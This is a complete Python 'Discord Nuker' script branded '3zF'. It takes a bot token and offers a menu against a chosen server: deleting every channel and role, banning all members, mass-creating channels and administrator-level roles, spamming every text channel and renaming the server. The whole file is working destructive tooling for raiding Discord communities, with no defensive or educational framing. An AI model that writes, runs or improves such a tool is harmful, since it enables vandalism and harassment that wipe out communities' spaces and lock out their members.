import discord, asyncio, os, sys, random, time
from discord.ext import commands
from colorama import init, Fore, Back, Style

init(autoreset=True)

BANNER = f"""
{Fore.RED}{'='*55}
{Fore.RED}╔══════════════════════════════════════════╗
{Fore.RED}║{Fore.WHITE}          DISCORD NUKER - 3zF            {Fore.RED}║
{Fore.RED}║{Fore.WHITE}          ~ Tools By 3zF ~               {Fore.RED}║
{Fore.RED}╚══════════════════════════════════════════╝
{Fore.RED}{'='*55}

{Fore.RED}██████╗  ██████╗ ███████╗███████╗{Style.RESET_ALL}
{Fore.RED}╚════██╗██╔═████╗██╔════╝██╔════╝{Style.RESET_ALL}
{Fore.RED} █████╔╝██║██╔██║███████╗███████╗{Style.RESET_ALL}
{Fore.RED} ╚═══██╗████╔╝██║╚════██║╚════██║{Style.RESET_ALL}
{Fore.RED}██████╔╝╚██████╔╝███████║███████║{Style.RESET_ALL}
{Fore.RED}╚═════╝  ╚═════╝ ╚══════╝╚══════╝{Style.RESET_ALL}

{Fore.YELLOW}             Made by 3zF{Style.RESET_ALL}
"""

def show_banner(logged_as=None):
    os.system("cls || clear")
    print(BANNER)
    if logged_as:
        print(f"{Fore.GREEN}[+] Logged as {logged_as}{Style.RESET_ALL}")

show_banner()

token = input(f"{Fore.CYAN}> Token: {Style.RESET_ALL}")

intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents, help_command=None)

guild_target = None
running = True

@client.event
async def on_ready():
    global guild_target
    show_banner(client.user)

    guilds = list(client.guilds)
    print(f"{Fore.YELLOW}> Servers:{Style.RESET_ALL}")
    for i, g in enumerate(guilds):
        print(f"  {Fore.CYAN}{i+1}. {g.name} ({g.id}){Style.RESET_ALL}")

    while True:
        try:
            choice = int(input(f"\n{Fore.CYAN}> Choose server number: {Style.RESET_ALL}")) - 1
            if choice < 0 or choice >= len(guilds):
                print(f"{Fore.RED}[-] Invalid number{Style.RESET_ALL}")
                continue
            guild_target = guilds[choice]
            break
        except:
            print(f"{Fore.RED}[-] Enter a valid number{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}[+] Selected: {guild_target.name}{Style.RESET_ALL}")
    await main_menu()

async def main_menu():
    global running
    while running:
        print(f"\n{Fore.RED}{'='*55}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Server: {Fore.WHITE}{guild_target.name}{Style.RESET_ALL}")
        print(f"{Fore.RED}{'='*55}{Style.RESET_ALL}")
        print(f"  {Fore.RED}1{Fore.WHITE} > {Fore.CYAN}Delete All Channels{Style.RESET_ALL}")
        print(f"  {Fore.RED}2{Fore.WHITE} > {Fore.CYAN}Create Channels{Style.RESET_ALL}")
        print(f"  {Fore.RED}3{Fore.WHITE} > {Fore.CYAN}Ban All Members{Style.RESET_ALL}")
        print(f"  {Fore.RED}4{Fore.WHITE} > {Fore.CYAN}Delete All Roles{Style.RESET_ALL}")
        print(f"  {Fore.RED}5{Fore.WHITE} > {Fore.CYAN}Create Roles{Style.RESET_ALL}")
        print(f"  {Fore.RED}6{Fore.WHITE} > {Fore.CYAN}Spam All{Style.RESET_ALL}")
        print(f"  {Fore.RED}7{Fore.WHITE} > {Fore.CYAN}Change Server Name{Style.RESET_ALL}")
        print(f"  {Fore.RED}8{Fore.WHITE} > {Fore.CYAN}Exit{Style.RESET_ALL}")
        print(f"{Fore.RED}{'='*55}{Style.RESET_ALL}")

        choice = input(f"\n{Fore.CYAN}> Choose: {Style.RESET_ALL}").strip()

        if choice == "1":
            await delete_all_channels()
        elif choice == "2":
            await create_channels()
        elif choice == "3":
            await ban_all()
        elif choice == "4":
            await delete_all_roles()
        elif choice == "5":
            await create_roles()
        elif choice == "6":
            await spam_all()
        elif choice == "7":
            await change_name()
        elif choice == "8":
            running = False
            print(f"{Fore.GREEN}[+] Exited{Style.RESET_ALL}")
            await client.close()
            sys.exit(0)
        else:
            print(f"{Fore.RED}[-] Wrong number{Style.RESET_ALL}")

async def delete_all_channels():
    print(f"\n{Fore.YELLOW}[+] Deleting all channels...{Style.RESET_ALL}")
    count = 0
    for channel in guild_target.channels:
        try:
            await channel.delete()
            count += 1
        except:
            pass
    print(f"{Fore.GREEN}[+] Deleted {count} channels{Style.RESET_ALL}")

async def create_channels():
    try:
        num = int(input(f"{Fore.CYAN}> How many channels: {Style.RESET_ALL}"))
    except:
        print(f"{Fore.RED}[-] Number only{Style.RESET_ALL}")
        return
    name = input(f"{Fore.CYAN}> Channel name (ex: nuke-by-3zf): {Style.RESET_ALL}")
    cat_id = input(f"{Fore.CYAN}> Category ID (leave empty for none): {Style.RESET_ALL}").strip()

    print(f"{Fore.YELLOW}[+] Creating channels...{Style.RESET_ALL}")
    count = 0
    for i in range(num):
        try:
            if cat_id:
                cat = client.get_channel(int(cat_id))
                if cat:
                    await guild_target.create_text_channel(f"{name}-{i+1}", category=cat)
                else:
                    await guild_target.create_text_channel(f"{name}-{i+1}")
            else:
                await guild_target.create_text_channel(f"{name}-{i+1}")
            count += 1
        except:
            pass
    print(f"{Fore.GREEN}[+] Created {count} channels{Style.RESET_ALL}")

async def ban_all():
    confirm = input(f"{Fore.RED}> Sure you want to ban everyone? (yes/no): {Style.RESET_ALL}")
    if confirm.lower() != "yes":
        print(f"{Fore.RED}[-] Cancelled{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}[+] Banning all members...{Style.RESET_ALL}")
    await guild_target.fetch_members()
    count = 0
    for member in guild_target.members:
        if member.id == client.user.id:
            continue
        try:
            await member.ban(reason="Nuked by 3zF")
            count += 1
        except:
            pass
    print(f"{Fore.GREEN}[+] Banned {count} members{Style.RESET_ALL}")

async def delete_all_roles():
    print(f"{Fore.YELLOW}[+] Deleting all roles...{Style.RESET_ALL}")
    count = 0
    for role in guild_target.roles:
        if role.name == "@everyone":
            continue
        try:
            await role.delete()
            count += 1
        except:
            pass
    print(f"{Fore.GREEN}[+] Deleted {count} roles{Style.RESET_ALL}")

async def create_roles():
    try:
        num = int(input(f"{Fore.CYAN}> How many roles: {Style.RESET_ALL}"))
    except:
        print(f"{Fore.RED}[-] Number only{Style.RESET_ALL}")
        return
    name = input(f"{Fore.CYAN}> Role name: {Style.RESET_ALL}")
    color_input = input(f"{Fore.CYAN}> Color (Hex like #FF0000 or type random): {Style.RESET_ALL}").strip()

    print(f"{Fore.YELLOW}[+] Creating roles...{Style.RESET_ALL}")
    count = 0
    for i in range(num):
        try:
            if color_input.lower() == "random":
                color = random.randint(0, 0xFFFFFF)
            else:
                color = int(color_input.replace("#", ""), 16)
            await guild_target.create_role(
                name=f"{name}-{i+1}",
                color=discord.Color(color),
                permissions=discord.Permissions(administrator=True)
            )
            count += 1
        except:
            pass
    print(f"{Fore.GREEN}[+] Created {count} roles{Style.RESET_ALL}")

async def spam_all():
    try:
        count = int(input(f"{Fore.CYAN}> How many messages per channel: {Style.RESET_ALL}"))
    except:
        print(f"{Fore.RED}[-] Number only{Style.RESET_ALL}")
        return
    msg = input(f"{Fore.CYAN}> Message: {Style.RESET_ALL}")

    print(f"{Fore.YELLOW}[+] Spamming...{Style.RESET_ALL} {Fore.RED}🔥{Style.RESET_ALL}")
    sent = 0
    for i in range(count):
        for channel in guild_target.text_channels:
            try:
                await channel.send(msg)
                sent += 1
            except:
                pass
    print(f"{Fore.GREEN}[+] Sent {sent} messages{Style.RESET_ALL}")

async def change_name():
    name = input(f"{Fore.CYAN}> New server name: {Style.RESET_ALL}")
    try:
        await guild_target.edit(name=name)
        print(f"{Fore.GREEN}[+] Server name changed to: {name}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}[-] Failed to change name{Style.RESET_ALL}")

try:
    client.run(token)
except:
    print(f"{Fore.RED}[-] Invalid token{Style.RESET_ALL}")
    sys.exit(1)
